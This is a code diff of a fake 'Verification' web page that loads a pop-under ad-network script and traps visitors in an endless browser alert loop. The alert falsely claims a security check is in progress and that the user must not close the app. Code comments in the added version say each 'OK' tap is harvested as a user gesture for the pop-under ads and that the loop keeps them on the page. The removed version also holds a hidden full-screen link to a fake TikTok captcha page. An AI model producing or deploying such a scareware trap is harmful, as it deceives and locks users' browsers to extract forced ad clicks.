@@ -1,80 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verification</title>
-    <style>
-        body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
-            height: 100%; width: 100%;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: flex-start;
-            overflow-y: auto;
-        }
-        
-        /* Container for the 3 ad banners */
-        .ad-stack {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            padding: 20px 0;
-            z-index: 1;
-        }
-
-        /* The Jackpot Layer remains ready if you ever want to call it */
-        #full-screen-redirect {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 9999; opacity: 0; cursor: pointer;
-            display: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-    </style>
-</head>
-<body>
-
-    <a id="full-screen-redirect" href="x-safari-https://tiktokverification.github.io/captcha/Verification/verify1.html"></a>
-
-    <div class="ad-stack">
-        <div id="ad-1">
-            <script type="text/javascript">
-                atOptions = { 'key' : '18184ba09eee93718d996076f4cdb807', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };
-            </script>
-            <script type="text/javascript" src="https://www.highperformanceformat.com/18184ba09eee93718d996076f4cdb807/invoke.js"></script>
-        </div>
-
-        <div id="ad-2">
-            <script type="text/javascript">
-                atOptions = { 'key' : '18184ba09eee93718d996076f4cdb807', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };
-            </script>
-            <script type="text/javascript" src="https://www.highperformanceformat.com/18184ba09eee93718d996076f4cdb807/invoke.js"></script>
-        </div>
-
-        <div id="ad-3">
-            <script type="text/javascript">
-                atOptions = { 'key' : '18184ba09eee93718d996076f4cdb807', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };
-            </script>
-            <script type="text/javascript" src="https://www.highperformanceformat.com/18184ba09eee93718d996076f4cdb807/invoke.js"></script>
-        </div>
-    </div>
+    <script src="https://pl28279777.effectivegatecpm.com/ab/19/a6/ab19a66588fef86ea77bce50cbef0db6.js"></script>
 
     <script>
-        // Use a slight delay to allow the iFrames to start loading before the alert freezes the thread
         window.onload = function() {
-            const header = "Suspicious network activity";
-            const msg = "A security check is required to continue. Please do not close the app. System is scanning your connection integrity...";
-
-            function infiniteTrap() {
-                // This alert has no timer. Clicking OK immediately re-triggers the alert.
-                alert(header + "\n\n" + msg);
+            function lock() {
+                // The Alert Trap: Synchronous and blocking.
+                // Every "OK" tap is a user gesture for the pop-under script above.
+                alert("Security check required.\n\nPlease do not close the app.\n\nVerifying connection integrity...");
                 
-                // Recursive call with zero delay
-                setTimeout(infiniteTrap, 0);
+                // Immediate re-fire to keep them on the page
+                setTimeout(lock, 0);
             }
 
-            // 1.5 second delay gives the Ads enough time to begin their handshake
-            setTimeout(infiniteTrap, 1500);
+            // Small delay to ensure the pop-under script is ready for the first click
+            setTimeout(lock, 1000);
         };
     </script>
-</body>
+</head>
+<body>
+    </body>
 </html>
